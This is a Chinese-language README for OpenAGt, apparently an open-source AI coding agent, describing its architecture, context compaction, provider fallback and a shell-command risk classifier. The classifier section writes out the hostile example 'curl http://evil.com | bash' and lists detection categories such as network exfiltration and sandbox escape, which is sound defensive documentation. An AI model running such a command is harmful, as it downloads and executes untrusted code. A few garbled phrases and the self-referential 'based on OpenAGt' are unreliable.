# OpenAGt

> 基于 [OpenAGt](https://github.com/Yecyi/OpenAGt) 构建的增强型开源 AI 编程智能体，具备先进的上下文压缩、工具并发控制和 Flutter 移动端支持。

---

## 目录

- [关于 OpenAGt](#关于-openagt)
- [系统架构](#系统架构)
  - [核心模块依赖图](#核心模块依赖图)
- [核心算法详解](#核心算法详解)
  - [三层渐进式压缩](#1-三层渐进式压缩)
  - [工具并发分区](#2-工具并发分区)
  - [Provider 降级链](#3-provider-降级链)
  - [Shell 安全分析](#4-shell-安全分析)
- [技术栈](#技术栈)
- [项目结构](#项目结构)
- [快速开始](#快速开始)
  - [环境要求](#环境要求)
  - [安装和运行](#安装和运行)
  - [开发命令](#开发命令)
- [核心类型系统](#核心类型系统)
  - [MessageV2 结构](#messagev2-结构)
  - [SyncEvent 事件溯源](#syncevent-事件溯源)
- [扩展阅读](#扩展阅读)
  - [详细技术分析](#详细技术分析)
  - [包文档](#包文档)
  - [核心模块文档](#核心模块文档)
  - [设计系统](#设计系统)
- [参考资料](#参考资料)
- [许可证](#许可证)
- [贡献指南](#贡献指南)

---

## 关于 OpenAGt

OpenAGt 是一个基于 [OpenAGt](https://github.com/Yecyi/OpenAGt) 的研究和开源项目，通过增强算法、改进可扩展性和原生移动应用支持扩展了原项目的功能。

**相对于 OpenAGt 的主要增强：**

- **三层渐进式压缩** — 灵感来自 Claude Code 和 Hermes Agent 的分层上下文管理，在保留关键信息的同时减少 40-55% 的 Token 使用量
- **工具并发分区** — 安全/非安全工具的并行执行管理，延迟降低 2-3 倍
- **Provider 降级链** — 在限流和服务出错时自动在 LLM Provider（Anthropic、OpenAI、Google 等）之间切换
- **Prompt 注入防护** — 对上下文中文件的对抗性指令进行安全扫描
- **Flutter 移动客户端** — 用于远程智能体控制的原生 iOS/Android 应用
- **逾渗压缩** — Hermes 风格的核心成员特质，保留逾渗压缩的上下文

---

## 系统架构

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           客户端层 (Clients)                             │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌─────────┐ │
│  │   TUI   │  │   Web   │  │Desktop  │  │Flutter  │  │  ACP   │ │
│  │  (CLI)  │  │ (Solid) │  │ (Tauri) │  │ Mobile  │  │Protocol│ │
│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └────┬────┘ │
└────────┼───────────────┼───────────────┼───────────────┼─────────────┼────┘
         │               │               │               │             │
         └───────────────┴───────────────┴───────────────┘             │
                              │                                       │
                       HTTP + SSE / WebSocket                         │
                              │                                       │
┌─────────────────────────────────────────────────────────────────────────────┐
│                   OpenAGt 服务端 (Hono + Effect Framework)              │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐           │
│  │ Session   │  │   Tool    │  │ Provider  │  │Compaction │           │
│  │ Manager   │  │ Registry  │  │ Manager   │  │  Engine   │           │
│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘           │
│  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐           │
│  │   LSP     │  │   MCP     │  │Permission │  │   ACP     │           │
│  │ Service   │  │ Manager   │  │  Engine   │  │ Protocol  │           │
│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘           │
│  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐  ┌─────┴─────┐           │
│  │   Bus     │  │ Sandbox   │  │  Config   │  │   Sync    │           │
│  │ (PubSub)  │  │  Broker   │  │  Service  │  │  Event    │           │
│  └───────────┘  └───────────┘  └───────────┘  └───────────┘           │
└─────────────────────────────────────────────────────────────────────────────┘
                              │
                              │
┌─────────────────────────────────────────────────────────────────────────────┐
│                   SQLite (WAL Mode) + File System                      │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐                        │
│  │  Message  │  │  Session  │  │   Event   │                        │
│  │   Table   │  │   Table   │  │ Sequence  │                        │
│  └───────────┘  └───────────┘  └───────────┘                        │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 核心模块依赖图

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          Effect Framework                               │
│  ┌─────────────────────────────────────────────────────────────────────┐ │
│  │                   Runtime & Context System                        │ │
│  │  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐      │ │
│  │  │ makeRuntime   │  │ InstanceState  │  │   MemoMap      │      │ │
│  │  └────────────────┘  └────────────────┘  └────────────────┘      │ │
│  └─────────────────────────────────────────────────────────────────────┘ │
│                                    │                                      │
│        ┌───────────────────────────┼───────────────────────────┐        │
│        │                           │                           │        │
│  ┌─────┴─────┐              ┌─────┴─────┐              ┌─────┴─────┐ │
│  │ Provider  │              │  Session  │              │  Config   │ │
│  │ Service   │              │  Service   │              │  Service  │ │
│  │           │              │            │              │           │ │
│  │┌─────────┐│              │┌─────────┐ │              │┌─────────┐ │ │
│  ││25+ LLM  ││              ││MessageV2 │ │              ││ Agent   │ │ │
│  ││Providers ││              ││Compaction│ │              ││ Config  │ │ │
│  ││Fallback  ││              ││ Token    │ │              ││ Command │ │ │
│  ││ Chain   ││              ││ Budget   │ │              ││ Model   │ │ │
│  │└─────────┘│              │└─────────┘ │              │└─────────┘ │ │
│  └───────────┘              └─────────────┘              └───────────┘ │
│                                    │                                      │
│                                    │                                      │
└────────────────────────────────────┼────────────────────────────────────┘
                                     │
        ┌────────────────────────────┼────────────────────────────┐
        │                            │                            │
  ┌─────┴─────┐              ┌─────┴─────┐              ┌─────┴─────┐
  │    Bus    │              │  Sandbox  │              │   Sync    │
  │  (PubSub) │              │  Broker   │              │  Event    │
  │           │              │           │              │  Sourcing  │
  └───────────┘              └───────────┘              └───────────┘
                                     │
                                     │
┌────────────────────────────────────┼────────────────────────────────────┐
│                          Tool Execution Layer                           │
│  ┌───────────┐              ┌───────────┐              ┌───────────┐ │
│  │   Tool    │              │  Shell    │              │ Security  │
│  │ Partition │              │ Security  │              │  Scanner  │
│  │           │              │           │              │           │
│  │ Safe:     │              │┌─────────┐│              │┌─────────┐│ │
│  │ read/grep/│              ││Command  ││              ││Injection││ │
│  │ glob/webfetch│           ││Classifier││              ││Detection││ │
│  │           │              ││风险评估 ││              ││ 沙箱    ││ │
│  │ Unsafe:   │              │└─────────┘│              ││ 策略    ││ │
│  │ bash/edit/│              │           │              │└─────────┘│ │
│  │ write/task│              │           │              │           │ │
│  └───────────┘              └───────────┘              └───────────┘ │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 核心算法详解

### 1. 三层渐进式压缩

```
Token 使用量
│
│ 100% ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
│
│                                    ████████████████████████████
│ 0%  ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
│     Micro    Auto        Full          Blocking
│     Compact  Compact     Compact       Limit
│     ($0)     ($0)        (~$0.03-0.09)
│     简单丢弃  内存瑶佺       LLM 摘要        阻断

压缩优先线计算公式：
priority = log(age_minutes + 1) × (11 - importance) + contentWeight × 0.5

其中：
- age_minutes: 工具结果距今分钟数的对数
- importance: 工具重要性权重 (1-10, 10=最高)
- contentWeight: 内容保留指数 (基于内容类型)
```

### 2. 工具并发分区

```
工具调用序列: [read, glob, edit, bash, grep, write]
                      │
                      ▼
        ┌─────────────────────────┐
        │     ToolPartition       │
        │ partitionToolCalls()    │
        └───────────┬─────────────┘
                    │
      ┌─────────────┴─────────────┐
      ▼                           ▼
┌───────────┐              ┌───────────┐
│Safe Batch │              │ Unsafe    │
│(并行执行)  │              │(串行执行)  │
│ ┌───────┐ │              │ ┌───────┐ │
│ │read   │ │              │ │edit   │ │
│ │glob   │ │              │ │bash   │ │
│ │grep   │ │              │ │write  │ │
│ │       │ │              │ │task   │ │
│ └───────┘ │              │ └───────┘ │
└───────────┘              └───────────┘

安全工具集: read, glob, grep, webfetch, codesearch, websearch, lsp, question, skill
非安全工具集: bash, edit, write, task, todo, plan, apply_patch
```

### 3. Provider 降级链

```
请求 ──▶ anthropic/claude-sonnet-4
              │
              │ 429 Rate Limit
              ▼
              openai/gpt-4o
              │                       │
              │ 429 Rate Limit        │
              ▼                       ▼
              google/gemini-2.5-pro
              │                       │
              │ 500 Server Error      │
              │                       ▼
              │              可能再次降级
              │
              ▼
              成功

降级决策逻辑：
- 429 (Rate Limit): 立即降级
- 500/502/503/504: 立即降级
- 包含 "rate limit" 或 "overloaded" 的错误消息: 降级
- 其他错误: 不降级
```

### 4. Shell 安全分析

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       Shell 命令安全分析流程                            │
└─────────────────────────────────────────────────────────────────────────────┘

输入命令: curl http://evil.com | bash
                │
                ▼
        ┌──────────────────┐
        │  WrapperStripper │
        │ 移除 wrapper (noglob, semicolons等) │
        └────────┬─────────┘
                 │
                 ▼
        ┌──────────────────┐
        │ CommandClassifier │
        │  正则模式匹配检测风险特征 │
        │                   │
        │  检测类别：        │
        │  - injection (注入)                  │
        │  - obfuscation (混淆)                │
        │  - parse_integrity (解析完整性)        │
        │  - interpreter_escalation (解释器升级) │
        │  - filesystem_destruction (文件系统)   │
        │  - network_exfiltration (网络渗出)     │
        │  - sandbox_escape (沙箱逃逸)          │
        │  - environment_hijack (环境劫持)      │
        └────────┬─────────┘
                 │
                 ▼
        ┌──────────────────┐
        │  Risk Level      │
        │  safe           │
        │  low            │
        │  medium  ─── shouldBlock() 检查
        │  high           │
        └────────┬─────────┘
                 │
                 ▼
        ┌──────────────────┐
        │   Decision       │
        │ allow  ──▶ 执行 │
        │ confirm ──▶ 确认│
        │ block  ──▶ 拒绝 │
        └──────────────────┘
```

---

## 技术栈

| 组件 | 技术 |
|------|------|
| 核心运行时 | TypeScript + Bun |
| 框架 | Effect v4 (函数式编程) |
| AI SDK | Vercel AI SDK (25+ providers) |
| HTTP 服务端 | Hono |
| 数据库 | SQLite (Drizzle ORM, WAL 模式) |
| Web 框架 | SolidJS |
| 桌面端 | Tauri 2 + Electron |
| 移动端 | Flutter (计划中) |
| 终端 UI | @opentui/core + SolidJS |
| 协议 | ACP (Agent Communication Protocol) |
| 事件系统 | SyncEvent (事件溯源) |

---

## 项目结构

```
openag/
├── packages/
│   ├── openagt/              # 核心智能体引擎
│   │   └── src/
│   │       ├── session/       # 会话管理、消息、压缩
│   │       │   ├── message-v2.ts    # 消息模型 (Part/Info 类型)
│   │       │   ├── compaction/      # 三层压缩引擎
│   │       │   │   ├── auto.ts       # AutoCompact + CircuitBreaker
│   │       │   │   ├── importance.ts  # 工具重要性计算
│   │       │   │   └── ...
│   │       │   └── session.ts        # Session Service
│   │       │
│   │       ├── provider/      # LLM Provider 管理
│   │       │   ├── provider.ts # 25+ Provider 加载
│   │       │   ├── fallback.ts  # 降级链逻辑
│   │       │   ├── error.ts     # 错误类型解析
│   │       │   └── schema.ts    # Provider/Model 类型定义
│   │       │
│   │       ├── tool/          # 工具系统
│   │       │   ├── partition.ts # 并发安全分区
│   │       │   ├── registry.ts  # 工具定义注册表
│   │       │   └── truncate.ts  # 结果截断
│   │       │
│   │       ├── security/      # 安全防护
│   │       │   ├── shell-security.ts  # Shell 命令分析
│   │       │   ├── command-classifier.ts # 风险模式匹配
│   │       │   └── wrapper-stripper.ts  # wrapper 移除
│   │       │
│   │       ├── bus/           # 事件总线 (PubSub)
│   │       │   ├── index.ts    # Bus Service
│   │       │   └── bus-event.ts # 事件定义
│   │       │
│   │       ├── sync/          # 事件溯源
│   │       │   └── index.ts   # SyncEvent.run/replay
│   │       │
│   │       ├── sandbox/       # 沙箱执行
│   │       │   ├── broker.ts   # IPC Broker 进程管理
│   │       │   ├── policy.ts   # 沙箱策略解析
│   │       │   └── types.ts   # 类型定义
│   │       │
│   │       ├── config/        # 配置管理
│   │       │   ├── agent.ts   # Agent 配置
│   │       │   ├── command.ts # 命令配置
│   │       │   └── provider.ts # Provider 配置
│   │       │
│   │       ├── effect/        # Effect 框架扩展
│   │       │   ├── run-service.ts  # makeRuntime
│   │       │   ├── instance-state.ts # ScopedCache
│   │       │   ├── memo-map.ts     # Layer 去重
│   │       │   └── ...
│   │       │
│   │       ├── storage/       # 数据库
│   │       │   ├── schema.sql.ts   # Drizzle Schema
│   │       │   └── index.ts        # Storage Service
│   │       │
│   │       ├── acp/           # ACP 协议
│   │       ├── lsp/           # LSP 服务 (语言智能)
│   │       ├── mcp/           # MCP 管理器 (Model Context Protocol)
│   │       ├── permission/    # 权限引擎
│   │       └── ...
│   │
│   ├── app/                  # SolidJS Web 应用
│   ├── desktop/              # Tauri 桌面应用
│   ├── sdk/                  # 客户端 SDK
│   ├── docs/                  # Mintlify 文档
│   └── enterprise/            # 企业版
│
├── docs/
│   └── TECHNICAL_ANALYSIS_REPORT.md  # 完整技术分析
│
└── Code Reference/
    ├── CC Source Code/   # Claude Code 参考实现
    └── hermes-agent/     # Hermes Agent 参考
```

---

## 快速开始

### 环境要求

- [Bun](https://bun.sh) 1.0+ 或 Node.js 20+
- Git

### 安装和运行

```bash
# 克隆仓库
git clone https://github.com/Yecyi/OpenAGt.git
cd OpenAGt

# 安装依赖
bun install

# 启动服务端
bun run dev

# 在另一个终端启动 TUI
bun run openag
```

### 开发命令

```bash
# 类型检查
bun typecheck

# 代码检查
bun lint

# 运行测试 (从包目录运行)
bun test packages/openagt
```

---

## 核心类型系统

### MessageV2 结构

```
Message
├── User
│   ├── id, sessionID
│   ├── role: "user"
│   ├── format: OutputFormat
│   ├── system?, tools?
│   └── summary?, agent, model
│
├── Assistant
│   ├── id, sessionID
│   ├── role: "assistant"
│   ├── modelID, providerID
│   ├── error?, finish?
│   ├── cost, tokens
│   └── parentID, path, summary
│
└── Parts[]
    ├── TextPart        # 文本内容
    ├── ReasoningPart    # 推理过程
    ├── ToolPart        # 工具调用
    │   ├── status: pending | running | completed | error
    │   ├── callID, tool
    │   └── state: ToolState*
    ├── FilePart        # 文件/媒体
    ├── SnapshotPart    # 快照
    ├── CompactionPart  # 压缩标记
    └── StepFinishPart  # 步骤完成
```

### SyncEvent 事件溯源

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                   SyncEvent 定义                           │
└─────────────────────────────────────────────────────────────────────────────┘
SyncEvent.define({
  type: "session.created",
  version: 1,
  aggregate: "sessionID",  // 聚合根
  schema: z.object({ sessionID, info })
})
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                   事件生命周期                               │
└─────────────────────────────────────────────────────────────────────────────┘
SyncEvent.run(Created, data)
         │
         ▼
Database.transaction (immediate)
         │
         ▼
projector(db, data) ──▶ 状态变更
         │
         ▼
EventSequenceTable ──▶ seq = last + 1
         │
         ▼
EventTable ──▶ 持久化事件
         │
         ▼
Bus.publish ──▶ 事件通知
```

---

## 扩展阅读

### 详细技术分析

完整的架构、算法增强和 Flutter 可行性研究，请参考：

- [docs/TECHNICAL_ANALYSIS_REPORT.md](./docs/TECHNICAL_ANALYSIS_REPORT.md)

涵盖内容：
- 架构比较 (OpenAGt vs Claude Code vs Hermes Agent)
- 三层压缩算法设计
- 工具并发分区实现
- Provider 降级链设计
- 安全威胁建模
- 性能基准测试
- Flutter 移动应用可行性
- 实现路线图

### 包文档

| 包 | 描述 |
|-----|------|
| [packages/openagt/README.md](./packages/openagt/README.md) | 核心智能体引擎 |
| [packages/app/README.md](./packages/app/README.md) | SolidJS Web 应用 |
| [packages/docs/README.md](./packages/docs/README.md) | Mintlify 文档站点 |
| [packages/web/README.md](./packages/web/README.md) | Astro Starlight 文档 |
| [packages/enterprise/README.md](./packages/enterprise/README.md) | 企业版功能 |

### 核心模块文档

| 模块 | 描述 |
|------|------|
| [packages/openagt/src/effect/README.md](./packages/openagt/src/effect/README.md) | Effect Framework 集成 |
| [packages/openagt/src/acp/README.md](./packages/openagt/src/acp/README.md) | ACP 协议实现 |
| [packages/openagt/src/sync/README.md](./packages/openagt/src/sync/README.md) | SyncEvent 事件溯源 |
| [packages/openagt/src/provider/README.md](./packages/openagt/src/provider/README.md) | LLM Provider 抽象 |
| [packages/openagt/src/mcp/README.md](./packages/openagt/src/mcp/README.md) | MCP 服务器管理 |
| [packages/openagt/src/lsp/README.md](./packages/openagt/src/lsp/README.md) | LSP 语言服务器 |

### 设计系统

- [OpenAGt Theme Design/](OpenAGt%20Theme%20Design/)

---

## 参考资料

- [OpenAGt](https://github.com/Yecyi/OpenAGt) — 基础项目
- [Hermes Agent](https://github.com/NousResearch/hermes-agent) — 参考实现
- [Vercel AI SDK](https://sdk.vercel.ai) — AI Provider 抽象
- [Effect Framework](https://effect.website) — 函数式编程
- [Drizzle ORM](https://orm.drizzle.team) — SQLite ORM
- [ACP Specification](https://agentclientprotocol.com/) — Agent 通信协议

---

## 许可证

MIT License — 参见 [LICENSE](./LICENSE)

---

## 贡献指南

欢迎贡献！提交 PR 前请阅读贡献指南。

---

**注意：** OpenAGt 是一个独立的研究项目。它与 Anthropic、OpenAI 或 OpenAGt 团队没有关联、认可或支持关系。
